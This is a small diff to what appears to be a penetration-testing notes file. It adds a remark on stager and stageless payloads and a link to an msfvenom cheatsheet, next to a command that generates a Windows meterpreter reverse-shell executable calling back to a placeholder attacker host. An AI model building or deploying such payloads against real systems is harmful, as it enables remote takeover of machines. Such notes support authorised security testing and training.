@@ -5863,6 +5863,10 @@ proxychains -q msfconsole
 
 ###### Generate Payload
 
+Types of payloads Stager or Stageless 
+
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
 ```c
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
 ```
